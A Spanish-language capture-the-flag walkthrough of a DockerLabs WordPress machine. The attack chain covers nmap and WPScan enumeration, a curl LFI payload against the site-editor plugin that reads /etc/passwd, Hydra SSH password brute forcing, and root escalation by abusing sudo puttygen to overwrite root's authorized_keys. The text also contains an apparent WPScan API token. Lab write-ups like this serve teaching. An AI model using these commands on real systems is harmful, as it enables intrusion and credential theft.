Deplegamos maquina de dockerlabs con

`sudo ./auto_deploy.sh injection.tar`

hacemos un brarido con **nmap** para lista los puertos abiertios usando 

`sudo nmap -p- --open -sS -sCV --min-rate 5000 -n -Pn -vvv 172.17.0.2 -oN scaning.txt`

![[Pasted image 20240812171247.png]]

Ok lugo de hacer el barido de puertos obsevamos que la maquina tiene abiertos el puerto **22, 80** puertos comunes que ya conecemos. Analisando cada puerto obesrvamos que puerto 22 **SSH** con una version de **OpenSSH  9.2p1** no tan actual pero de igunamente no nos permite usar exploits para enuemar usaurios como lo es el  **Username Enumeration**. y finalmente  el puerto 80 **http** en el cual vemos en que tien un titulo llamdo  **Asucar Moreno**  en su sitio web ya que es un **APACHE  2.4.52** y Alago muy importante es un sitio creado con tecnologia **Worpress 6.5.3** Algo que nos llama la antecion de imdiato ya que podemos usar hermaintas como WPSacn para sacanear este sition pero primero vamos a web y veamo que encontramos.

![[Pasted image 20240812171757.png]]

investigando un poco vemos que la web se ve  un poco estraña y que tiene un pagina de prueba llamado hello world damo click y observamos que aplica virtual  hosting asi que ya sabemos que hacer implemnete en la ruta **/etc/host** y la **asucar.dl**  se pude hacer de muchas maneras pero hoy voy a usar los siguetes comandos
1. abrimos con sudo el /etc/host con `sudo nano /etc/host` 
2. luego introducimos las lineas
	* `172.17.0.2   asucar.dl` 
	* damos `CTRL+X` damos `YES`  y `Enter` para guardar los cambios
3. finalmente recargamos la paguinas.
![[Pasted image 20240812172824.png]]

vemos que la paguina ha cambiado. ok lugo de todo esto  y no haber encontrado cosinanada lanzamos la heramienta WPScan y analizamonos los resultados.

`wpscan --url http://asucar.dl -e vp,u --api-token='AskAj1yEFAsVmrbhwaEj97f3aXs1GBpjg7L5oyfIUNs'`

![[Pasted image 20240812174230.png]]
![[Pasted image 20240812174305.png]]

vemos dos resulatado interesante el primero es una vulnerabilidad de pluguin site-editor ya que no se encurntra actualizada  y hay un posibles **Local File Inclution** y por otra pate tenenemos el usuario **wordpress** inetnetamos iniciara sesion con el pero no logramos nada asi que explotariomos la vilnerablidad del *LFI*.

principalmente vamos *searchsploit* ya busquemos a ver que nos dice
![[Pasted image 20240812174722.png]]
vemos dos resulatados  el primero deun drupla peno no nos interesas y el que estamos bucando el  LFI  de wordpress  asi que con el  `searchsplit -m 'name expolit'` y lo pasamos a ruta actaual donde estamos trabajando los cambiere el nombre a *LFIsite-editor*

![[Pasted image 20240812175231.png]]

ok vemos que nos dice esta vualneriblidad. Segun la decripcion que tenemos sobre el LFI en resumen en parmatro *ajax_path* un parametro del extencion **/extensions/pagebuilder/includes/ajax_shortcode_pattern.php** nos permite listar achivos de la maquina. mas abajo encontramos un *Proof* un prubea de consepto donde nodicen que ejecutemos el comando 
`/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd`
 podemos usar el buscador o curl en su mayor defecto aquie usaremos curl 

`curl -s -X Get 'http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd' | grep -viE "nologin|{" | awk -F':' '{print $1}'`

![[Pasted image 20240812182937.png]]

comos vemos unasno expresiones regurlare podemos ver que usario con tenemos en el sistemas vemos *root* y otro muy ineteresante *curiosito* sabiendo que exite este usario lo siguiente por hacer es aplicar hydar para ver si tenene un contraseña vualnerable con el comando  

`hydra -l curiosito -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4`

![[Pasted image 20240812183713.png]]

bingo tenosmos el usuarion **curiosito** y la constraseña **password1** asi que inicsmaos por SSH 

`ssh curiosito@172.17.0.2`

![[Pasted image 20240812183911.png]]


Bien contienuemos con la escalda de privilijios como ya sabemos lo primero que veremos es que como podemo ejecutar con sudo asi que aplicamo `sudo -l`  y vemos.

![[Pasted image 20240814124752.png]]

super como vemos  puttygen  los podemos ejecutar como sudo asi que este un aplicatavo de putty por el cual uno puede generar id_rsa para conecctarse por ssh asi que lo aremos.

`/usr/bin/puttygen -t rsa -b 2048 -O private-openssh -o ~/.ssh/id`
`/usr/bin/puttygen -L ~/.ssh/id >> ~/.ssh/authorized_keys`
`sudo /usr/bin/puttygen /home/curiosito/.ssh/id -o /root/.ssh/id`
`sudo /usr/bin/puttygen /home/curiosito/.ssh/id -o /root/.ssh/authorized_keys -O public-openssh`

esta serie de comondo lo que nos ayuda es a crear un id_rsa para el usurio root  que luego nos copiaremos a nustro usuario con los siguinetes comandos

`scp curiosito@172.17.0.2:/home/curiosito/.ssh/id .`

este conado lo usamos para pasar la id_rsa que usaremos  recuerden usar `chmod 600 id` para cambiar los permisos y no tener conflictos.

final mente ejecutamos SSH

`ssh -i id root@172.17.0.2`

![[Pasted image 20240814131154.png]]


y ya somos root.


`by juandas13`
